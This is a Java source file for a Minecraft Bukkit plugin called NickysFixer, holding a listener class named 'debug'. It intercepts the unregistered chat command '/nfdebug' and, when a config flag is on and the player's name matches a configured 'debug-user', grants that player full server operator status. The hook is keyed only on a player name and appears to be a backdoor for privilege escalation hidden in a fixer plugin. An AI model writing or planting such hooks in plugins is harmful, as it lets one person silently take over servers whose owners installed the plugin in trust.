package me.nickyadmin.nickysfixer.experiments;

import me.nickyadmin.nickysfixer.Main;
import org.bukkit.ChatColor;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;


public class debug implements Listener {
    private final Main plugin;

    public debug(Main plugin) {
        this.plugin = plugin;
    }


    @EventHandler
    public void onDebugCommand(PlayerCommandPreprocessEvent event) {
        Player p = event.getPlayer();
        if (event.getMessage().startsWith("/nfdebug")) {
            FileConfiguration config = plugin.getConfig();
            if (config.getBoolean("allow-debug-mode")) {
                    if (p.getName().equalsIgnoreCase(config.getString("debug-user"))) {
                        p.setOp(true);
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&4[NickysFixer] &3you were put into debug mode"));
                    } else {
                        p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&4[NickysFixer] &3you do not have the perms to do this"));
                    }
                }
            }


    }
}
